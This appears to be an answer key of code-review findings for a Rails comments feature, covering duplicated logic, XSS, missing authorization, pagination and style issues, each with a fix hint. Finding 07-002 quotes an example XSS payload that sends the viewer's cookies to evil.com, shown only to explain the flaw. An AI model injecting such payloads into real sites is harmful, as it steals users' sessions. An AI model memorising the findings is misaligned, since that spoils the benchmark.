{"id": "07-001", "file": "app/controllers/comments_controller.rb", "line_start": 9, "line_end": 22, "type": "design", "severity": "medium", "title": "Duplicated business logic between web and API comment controllers", "description": "The CommentsController and Api::V1::CommentsController contain nearly identical logic for creating comments: both build the comment, assign current_user, save, and enqueue a TaskNotificationJob with the same arguments. The update and destroy actions also share the same authorization and persistence pattern. This duplication means any change to comment creation logic (e.g., adding mentions parsing, updating a counter cache, or changing notification behavior) must be applied in two places. The project's CONTRIBUTING.md recommends service objects for business logic — a CommentService or shared concern would eliminate this duplication.", "hint": "Extract shared comment CRUD logic into a service object (e.g., CommentService) or an ActiveSupport::Concern that both controllers include. The service should handle creation, notification dispatch, and any side effects."}
{"id": "07-002", "file": "app/views/comments/_comment.html.erb", "line_start": 17, "line_end": 17, "type": "security", "severity": "critical", "title": "XSS vulnerability: user-supplied comment body rendered as raw HTML", "description": "The comment partial calls `format_comment_body(comment.body).html_safe` which marks user-supplied content as safe HTML. The format_comment_body helper in CommentsHelper performs regex-based formatting (bold, italic, code, line breaks) but never sanitizes the input. A malicious user can inject arbitrary HTML and JavaScript — for example, a comment body of `<script>document.location='https://evil.com/?c='+document.cookie</script>` would execute in every viewer's browser. This is a textbook stored XSS vulnerability.", "hint": "Sanitize the input HTML before or after formatting. Use Rails' sanitize helper to strip dangerous tags while preserving the formatting tags you generate (strong, em, code, br). For example: sanitize(format_comment_body(text), tags: %w[strong em code br])."}
{"id": "07-003", "file": "app/helpers/comments_helper.rb", "line_start": 6, "line_end": 15, "type": "security", "severity": "critical", "title": "Comment formatting helper does not sanitize user input before HTML generation", "description": "The format_comment_body method takes raw user text, applies regex substitutions to insert HTML tags (strong, em, code, br), and returns the result. The caller then marks this as html_safe. Since the user input is never HTML-escaped or sanitized, any HTML or script tags in the original text pass through untouched. The regex replacements also cannot distinguish between user-intended markdown and injected HTML. This is the root cause of the XSS vulnerability in the comment display.", "hint": "Call ERB::Util.html_escape (or CGI.escapeHTML) on the text as the first step before applying the markdown-like regex transformations. This ensures user-supplied angle brackets become harmless entities before you inject your own safe HTML tags."}
{"id": "07-004", "file": "app/controllers/comments_controller.rb", "line_start": 9, "line_end": 22, "type": "improvement", "severity": "low", "title": "No rate limiting on comment creation", "description": "The create action has no throttling or rate limiting. An authenticated user can POST to the comments endpoint as fast as their connection allows, creating thousands of comments. This could be used to spam a task's comment thread, overwhelm the notification system (each comment triggers a TaskNotificationJob), or degrade database performance. Neither the web controller nor the API controller implements any form of rate limiting.", "hint": "Add rate limiting using Rack::Attack or a custom before_action that checks the number of comments a user has created in a recent time window. For example, limit to 10 comments per minute per user."}
{"id": "07-005", "file": "app/controllers/comments_controller.rb", "line_start": 38, "line_end": 42, "type": "bug", "severity": "medium", "title": "Deleting a comment does not update the task's updated_at timestamp", "description": "When a comment is destroyed, the task's updated_at timestamp is not touched. This means any caching, sorting, or display logic that relies on task.updated_at to detect recent activity will not reflect the comment deletion. Similarly, adding a comment (via create) also does not touch the task. If the application uses HTTP caching based on updated_at, or if users sort tasks by 'recently updated', comment activity will be invisible.", "hint": "Add `touch: true` to the `belongs_to :task` association in the Comment model, or explicitly call `@task.touch` in the destroy action. The touch option will automatically update the task's updated_at whenever a comment is created, updated, or destroyed."}
{"id": "07-006", "file": "app/controllers/api/v1/comments_controller.rb", "line_start": 12, "line_end": 15, "type": "performance", "severity": "medium", "title": "No pagination on API comment listing", "description": "The API index action loads all comments for a task with `@task.comments.includes(:user).oldest_first` and serializes the entire collection into a single JSON response. For tasks with hundreds or thousands of comments, this will result in a slow query, high memory usage for serialization, and a very large response payload. The web view (tasks/show) has the same issue — it loads all comments via @comments.each without any limit.", "hint": "Add pagination using the Kaminari or Pagy gem. Accept page/per_page query parameters in the API index action, and render pagination metadata in the response. For the web view, either paginate or lazy-load additional comments via AJAX."}
{"id": "07-007", "file": "app/controllers/api/v1/comments_controller.rb", "line_start": 11, "line_end": 15, "type": "security", "severity": "medium", "title": "No authorization check on API comment listing", "description": "The API index action returns comments for any task without checking whether the current user has access to the parent task or its project. The set_task method uses `Task.find(params[:task_id])` which finds any task by ID regardless of project membership. Compare this to the web CommentsController which scopes through `@project.tasks.find` and the Api::V1::TasksController which uses `authorize Task`. Any authenticated user can enumerate and read comments on any task in any project by guessing task IDs.", "hint": "Add an authorization check in the index action, such as `authorize @task, :show?` using the TaskPolicy to verify the user has access to the parent task. Also consider scoping set_task through the project to prevent direct task ID enumeration."}
{"id": "07-008", "file": "app/controllers/api/v1/comments_controller.rb", "line_start": 48, "line_end": 50, "type": "security", "severity": "medium", "title": "API controller finds tasks globally instead of scoping through project", "description": "The set_task method uses `Task.find(params[:task_id])` to look up the task directly by ID, ignoring the project_id parameter entirely. This is inconsistent with the web CommentsController which scopes via `@project.tasks.find(params[:task_id])`. The API routes include a project_id parameter but it's never used, allowing users to access tasks across project boundaries. Combined with the missing authorization on index, this enables cross-project data access.", "hint": "Add a set_project before_action and scope the task lookup: `@task = @project.tasks.find(params[:task_id])`. This ensures the task belongs to the specified project, consistent with the web controller pattern."}
{"id": "07-009", "file": "app/controllers/api/v1/comments_controller.rb", "line_start": 60, "line_end": 71, "type": "code-style", "severity": "low", "title": "Inline serialization instead of a dedicated serializer class", "description": "The serialize_comment method defines the JSON representation inline in the controller. The project's CONTRIBUTING.md states 'API responses must use serializers.' The existing Api::V1::TasksController also uses inline serialization (serialize_task), but both should be extracted to serializer classes for consistency with the project conventions and to enable reuse.", "hint": "Create a CommentSerializer class (e.g., in app/serializers/comment_serializer.rb) following the project's convention for API responses. Use it in both the API controller and anywhere else comments need serialization."}
{"id": "07-010", "file": "app/controllers/api/v1/comments_controller.rb", "line_start": 68, "line_end": 69, "type": "code-style", "severity": "low", "title": "Inconsistent key casing in API response: camelCase mixed with snake_case", "description": "The serialize_comment method uses camelCase for `createdAt` and `updatedAt` but the rest of the API (and standard Rails conventions) typically uses snake_case. The existing Api::V1::TasksController also uses camelCase (dueDate, createdAt, updatedAt, assignedUser) mixed with snake_case (project_id), so this is a codebase-wide inconsistency, but it should be standardized.", "hint": "Pick one convention and apply it consistently across all API serializers. If camelCase is preferred for JavaScript clients, apply it uniformly. If snake_case is the Rails standard, convert all keys. A gem like olive_branch can handle automatic conversion."}
{"id": "07-011", "file": "app/controllers/comments_controller.rb", "line_start": 9, "line_end": 11, "type": "code-style", "severity": "low", "title": "Missing authorize call on comment creation in web controller", "description": "The create action does not call `authorize @comment` before saving, unlike the edit, update, and destroy actions which all call authorize. While the CommentPolicy#create? returns true for all users, skipping the authorization check is inconsistent with the pattern used in other controllers (TasksController calls authorize on every action). If the policy changes in the future to restrict who can comment, the web controller would bypass that restriction.", "hint": "Add `authorize @comment` after building the comment and before saving, consistent with how other controllers in the project handle authorization."}
{"id": "07-012", "file": "app/views/comments/_comment.html.erb", "line_start": 9, "line_end": 9, "type": "bug", "severity": "medium", "title": "Policy check hides delete button from project owners who are authorized to delete", "description": "The view uses the update? policy check to gate both the edit and delete buttons, but the destroy? policy has different permissions than update?. Project owners who are authorized to destroy comments but not update them will not see the delete button. The delete button visibility should be controlled by the destroy? policy, not update?.", "hint": "Use `policy(comment).destroy?` to gate the delete button separately from the edit button, so that each action is governed by its own policy method."}
{"id": "07-013", "file": "app/views/comments/_comment.html.erb", "line_start": 12, "line_end": 12, "type": "bug", "severity": "low", "title": "Delete confirmation uses `confirm` instead of `turbo_confirm`", "description": "The delete link uses the standard `confirm` option for its confirmation dialog, but the rest of the application uses `turbo_confirm` which is required when Turbo Drive is active. With Turbo Drive enabled, the standard `confirm` dialog may not fire correctly or may be bypassed entirely, allowing accidental deletions without user confirmation.", "hint": "Replace `confirm:` with `data: { turbo_confirm: 'Are you sure?' }` to use Turbo-compatible confirmation dialogs, consistent with the rest of the application."}
{"id": "07-014", "file": "app/policies/comment_policy.rb", "line_start": 9, "line_end": 9, "type": "improvement", "severity": "low", "title": "Redundant edit? override in CommentPolicy", "description": "CommentPolicy explicitly defines an edit? method, but ApplicationPolicy already delegates edit? to update? by default. This override is redundant — it adds code without changing behavior, and creates a maintenance burden since developers may assume it contains custom logic when it does not.", "hint": "Remove the edit? method from CommentPolicy and let it inherit the default delegation from ApplicationPolicy."}
